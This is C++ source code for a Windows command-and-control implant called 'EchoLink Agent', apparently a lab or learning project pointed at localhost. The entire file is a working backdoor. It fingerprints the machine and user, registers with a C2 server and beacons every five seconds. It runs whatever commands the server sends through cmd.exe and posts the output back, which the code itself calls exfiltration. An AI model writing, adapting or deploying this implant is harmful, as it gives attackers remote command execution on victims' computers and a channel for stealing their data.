#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <string>
#include <sstream>
#include <iomanip>
#include <Lmcons.h> // Required for UNLEN (Maximum username length)
#include <memory>
#include <array>
#include <stdexcept>

// Link the WinHTTP library during compilation
#pragma comment(lib, "winhttp.lib")

// Function to generate a unique Agent ID based on Computer Name, User Name, and Process ID
std::string GenerateUniqueAgentID() {
    // 1. Get the Computer Name
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computerNameLen = sizeof(computerName);
    GetComputerNameA(computerName, &computerNameLen);

    // 2. Get the User Name
    char userName[UNLEN + 1];
    DWORD userNameLen = sizeof(userName);
    GetUserNameA(userName, &userNameLen);

    // 3. Get the Current Process ID (PID) to allow multiple agents on the same machine
    DWORD processId = GetCurrentProcessId();

    // 4. Combine all elements into a single string (e.g., "Desktop-PC_Admin_1044")
    std::string combinedInfo = std::string(computerName) + "_" + std::string(userName) + "_" + std::to_string(processId);

    // 5. Generate a hash value from the combined string
    std::hash<std::string> hasher;
    size_t hashValue = hasher(combinedInfo);

    // 6. Format the result as a hexadecimal string 
    std::stringstream ss;
    ss << "Agent_" << std::hex << std::uppercase << hashValue;

    return ss.str();
}

// Function to execute a shell command and capture its standard output
std::string ExecuteCommand(const std::string& command) {
    std::array<char, 128> buffer;
    std::string result;

    // Open a pipe to the command line, prepending "cmd.exe /c " to run it
    std::string fullCommand = "cmd.exe /c " + command;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(fullCommand.c_str(), "r"), _pclose);

    if (!pipe) {
        return "[-] Error: Failed to execute command.";
    }

    // Read the output from the pipe sequentially until the command finishes
    while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe.get()) != nullptr) {
        result += buffer.data();
    }

    // Handle commands that don't return an output string (e.g., 'mkdir')
    return result.empty() ? "[+] Command executed successfully (no output)." : result;
}

// Function to send the command execution results back to the C2 server
void SendResultsToServer(HINTERNET hConnect, const std::string& agentID, const std::string& output) {
    // Build the dynamic URL path for the POST request: /results/Agent_XXXX
    std::string pathString = "/results/" + agentID;
    std::wstring widePath(pathString.begin(), pathString.end());

    // Create an HTTP POST request targeting the results endpoint
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", widePath.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    if (hRequest) {
        // Define the Content-Type header as plain text
        LPCWSTR header = L"Content-Type: text/plain\r\n";

        // Send the HTTP request along with the execution output payload
        BOOL bResults = WinHttpSendRequest(hRequest, header, -1L, (LPVOID)output.c_str(), static_cast<DWORD>(output.length()), static_cast<DWORD>(output.length()), 0);

        if (bResults) {
            // Wait for acknowledgment from the server
            WinHttpReceiveResponse(hRequest, NULL);
            std::cout << "[+] Results successfully exfiltrated to the server." << std::endl;
        }
        else {
            std::cerr << "[-] Error: Failed to send results." << std::endl;
        }

        // Clean up the HTTP request handle
        WinHttpCloseHandle(hRequest);
    }
}

int main() {
    // Dynamically generate the Agent ID
    std::string agentID = GenerateUniqueAgentID();
    std::cout << "[*] Starting EchoLink Agent with ID: " << agentID << std::endl;

    // 1. Initialize the WinHTTP session and connection (Done only once)
    HINTERNET hSession = WinHttpOpen(L"EchoLink Agent/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, L"127.0.0.1", 5000, 0);

    if (!hSession || !hConnect) {
        std::cerr << "[-] Error: Failed to initialize WinHTTP." << std::endl;
        return 1;
    }

    // --- REGISTRATION PHASE (Runs only once at startup) ---

    // Create an HTTP POST request targeting the /register endpoint
    HINTERNET hRegRequest = WinHttpOpenRequest(hConnect, L"POST", L"/register", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    if (hRegRequest) {
        // Construct the JSON payload with the agent ID
        std::string jsonPayload = "{\"agent_id\": \"" + agentID + "\", \"os\": \"Windows\"}";
        LPCWSTR header = L"Content-Type: application/json\r\n";

        // Send the POST request to register the agent
        BOOL bRegSend = WinHttpSendRequest(hRegRequest, header, -1L, (LPVOID)jsonPayload.c_str(), jsonPayload.length(), jsonPayload.length(), 0);

        if (bRegSend) {
            // Wait for the server to acknowledge the registration
            WinHttpReceiveResponse(hRegRequest, NULL);
            std::cout << "[+] Successfully registered agent on the server." << std::endl;
        }
        else {
            std::cerr << "[-] Failed to send registration request." << std::endl;
        }

        // Clean up the registration request handle
        WinHttpCloseHandle(hRegRequest);
    }

    // 2. The Beaconing Loop (Infinite loop)
    while (true) {
        // Build the dynamic URL path for the GET request: /tasks/Agent_XXXX
        std::string pathString = "/tasks/" + agentID;
        // Convert the standard string to a wide string (required by WinHTTP)
        std::wstring widePath(pathString.begin(), pathString.end());

        // 3. Create an HTTP GET request to check for tasks
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", widePath.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

        if (hRequest) {
            // 4. Send the GET request (No JSON payload needed for a GET request)
            BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

            if (bResults) {
                // Wait for the server's response
                bResults = WinHttpReceiveResponse(hRequest, NULL);
            }

            if (bResults) {
                std::cout << "[+] Beacon sent successfully. Checking for tasks..." << std::endl;

                // Read the server's response to check if a task was received
                DWORD dwSize = 0;
                DWORD dwDownloaded = 0;
                WinHttpQueryDataAvailable(hRequest, &dwSize);

                if (dwSize > 0) {
                    char* pszOutBuffer = new char[dwSize + 1];
                    ZeroMemory(pszOutBuffer, dwSize + 1);

                    if (WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
                        std::string responseStr(pszOutBuffer);
                        std::cout << "    [-] Server response: " << responseStr << std::endl;

                        // Simple string parsing to extract the command from the JSON task field
                        std::string taskKey = "\"task\":\"";
                        size_t taskPos = responseStr.find(taskKey);

                        if (taskPos != std::string::npos) {
                            size_t startPos = taskPos + taskKey.length();
                            size_t endPos = responseStr.find("\"", startPos);

                            if (endPos != std::string::npos) {
                                std::string commandToRun = responseStr.substr(startPos, endPos - startPos);

                                std::cout << "\n Executing command: " << commandToRun << std::endl;

                                // 1. Execute the command on the target system
                                std::string executionOutput = ExecuteCommand(commandToRun);

                                // 2. Send the results back to the C2 server
                                SendResultsToServer(hConnect, agentID, executionOutput);
                            }
                        }
                    }
                    delete[] pszOutBuffer;
                }
            }
            else {
                std::cerr << "[-] Error: Failed to connect to server." << std::endl;
            }

            // Close the request handle for this specific iteration
            WinHttpCloseHandle(hRequest);
        }

        // 5. Sleep for 5 seconds (5000 milliseconds) to avoid overwhelming the server and to stay stealthy
        std::cout << "[*] Sleeping for 5 seconds...\n" << std::endl;
        Sleep(5000);
    }

    // Clean up connections (Unreachable code in an infinite loop, but good practice)
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 0;
}